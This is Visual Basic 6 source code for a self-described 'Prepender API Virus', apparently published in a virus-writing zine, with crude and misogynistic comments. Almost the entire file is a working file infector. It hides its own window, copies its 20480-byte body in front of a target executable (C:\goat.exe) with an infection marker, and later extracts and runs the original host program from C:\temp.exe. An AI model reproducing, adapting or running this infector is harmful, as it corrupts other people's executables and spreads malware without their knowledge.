   VERSION 5.00
   Begin VB.Form Form1
      Caption         =   "Form1"
      ClientHeight    =   3195
      ClientLeft      =   60
      ClientTop       =   345
      ClientWidth     =   4680
      LinkTopic       =   "Form1"
      ScaleHeight     =   3195
      ScaleWidth      =   4680
      StartUpPosition =   3  'Windows Default
      Visible         =   0   'False
   End
   Attribute VB_Name = "Form1"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = False
   Private Declare Function CreateFile Lib "kernel32.dll" Alias "CreateFileA" (ByVal lpFileName As String, ByVal dwDesiredAccess As Long, _
   ByVal dwShareMode As Long, lpSecurityAttributes As Any, ByVal dwCreationDisposition As Long, _
   ByVal dwFlagsAndAttributes As Long, ByVal hTemplateFile As Long) As Long
   Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
   Private Declare Function ReadFile Lib "kernel32.dll" (ByVal hFile As Long, lpBuffer As Any, ByVal nNumberOfBytesToRead As Long, lpNumberOfBytesRead As Long, lpOverlapped As Any) As Long
   Private Declare Function WriteFile Lib "kernel32.dll" (ByVal hFile As Long, lpBuffer As Any, ByVal nNumberOfBytesToWrite As Long, lpNumberOfBytesWritten As Long, lpOverlapped As Any) As Long
   Private Declare Function GetFileSize Lib "kernel32.dll" (ByVal hFile As Long, lpFileSizeHigh As Long) As Long
   Private Const GENERIC_READ = &H80000000
   Private Const GENERIC_WRITE = &H40000000
   Private Const FILE_SHARE_READ = &H1
   Private Const FILE_ATTRIBUTE_ARCHIVE = &H20
   Private Const OPEN_ALWAYS = 4
   Private Const FILE_ATTRIBUTE_NORMAL = &H80
   Private Const OPEN_EXISTING = 3
   Private Const Virus_Size = 20480                  'Virus Size
   Private Const GOAT = "C:\goat.exe"                'File to infect
   '*********************************************************************
   ' Prepender API Virus
   ' Made by Falckon/DCA
   ' inspired in a bitch called Marisol.... (oh i love u haha nah)
   ' to DCA Zine [Dark Coderz Alliance]
   '*********************************************************************
   Private Sub Form_Load()
   App.TaskVisible = False   'Hide Application
   Me.Hide                   'Hide
   If FileLen(App.EXEName + ".exe") <> Virus_Size Then  'im infected?
   Restruct_Host (App.EXEName + ".exe")
   End If
   File_Infecting (GOAT) ' Infect the exe!
   End ' Exit Teoric Virus
   End Sub
   Sub File_Infecting(File As String)
   On Error GoTo Final
   Infecting:
   Dim hFile As Long, SizeFile As Long
   Dim HostBuff As String, Read As Long
   Dim ReadNum As Long, MarK As String
   Dim Idif As String
   MarK = "File Infector"
   hFile = CreateFile(File, GENERIC_READ, FILE_SHARE_READ, ByVal CLng(0), OPEN_EXISTING, FILE_ATTRIBUTE_ARCHIVE, 0)
   If hFile = -1 Then GoTo Final
   SizeFile = GetFileSize(hFile, 0)     'File Size
   HostBuff = Space(SizeFile)           'Buffer
   Read = ReadFile(hFile, ByVal HostBuff, SizeFile, ReadNum, ByVal CLng(0))
   Idif = Right(HostBuff, Len(MarK)) 'Read the Mark
   CloseHandle (hFile)
   If Idif = MarK Then GoTo Final 'Is Infected?
      Dim VirWnum As Long
      Dim hFile2 As Long, SizeVirus As Long
      Dim VirBuff As String, WriteVir As Long
      Dim ReadVir As Long, ReadNum2 As Long
          hFile2 = CreateFile(App.EXEName + ".exe", GENERIC_READ, FILE_SHARE_READ, ByVal CLng(0), OPEN_EXISTING, FILE_ATTRIBUTE_ARCHIVE, 0)
          If hFile2 = -1 Then GoTo Final
          SizeVirus = Virus_Size     'Size of Virus
          VirBuff = Space(SizeVirus) 'Virus Buffer
          ReadVir = ReadFile(hFile2, ByVal VirBuff, SizeVirus, ReadNum2, ByVal CLng(0))
          CloseHandle (hFile2)
    Dim hFile3 As Long
    Dim WriteHost As Long, ReadNum3 As Long
    hFile3 = CreateFile(File, GENERIC_WRITE, 0, ByVal (0), OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0)
    If hFile3 = -1 Then GoTo Final
    WriteHost = WriteFile(hFile3, ByVal VirBuff + HostBuff + MarK, SizeVirus + SizeFile + 13, ReadNum3, ByVal (0))
    WriteHost = CloseHandle(hFile3)
   Final: 'FUCK u
   Exit Sub
   End Sub
   Sub Restruct_Host(File As String)
   Dim hFile As Long, VirusBuff As String
   Dim HostBuff As String, Read As Long
   Dim SizeFile As Long, VirusSize As Long
   Dim Read2 As Long
   hFile = CreateFile(File, GENERIC_READ, FILE_SHARE_READ, ByVal CLng(0), OPEN_EXISTING, FILE_ATTRIBUTE_ARCHIVE, 0)
   If hFile = -1 Then GoTo Final
   VirusSize = Virus_Size
   VirusBuff = Space(VirusSize)
   SizeFile = GetFileSize(hFile, 0)
   HostBuff = Space(SizeFile - VirusSize)
   Read = ReadFile(hFile, ByVal VirusBuff, VirusSize, ReadNum, ByVal CLng(0))
   Read2 = ReadFile(hFile, ByVal HostBuff, SizeFile - VirusSize, ReadNum, ByVal CLng(0))
   CloseHandle (hFile)
    Dim hFile2 As Long
    Dim WriteHost As Long, ReadNum2 As Long
    hFile2 = CreateFile("c:\temp.exe", GENERIC_WRITE, 0, ByVal (0), OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0)
    If hFile2 = -1 Then GoTo Final
    WriteHost = WriteFile(hFile2, ByVal HostBuff, SizeFile - VirusSize, ReadNum2, ByVal (0))
    CloseHandle (hFile2)
   Dim ExecuteHost As Double
   DoEvents  'Process other events
   ExecuteHost = Shell("C:\temp.exe")
   Final:
   Exit Sub
   End Sub
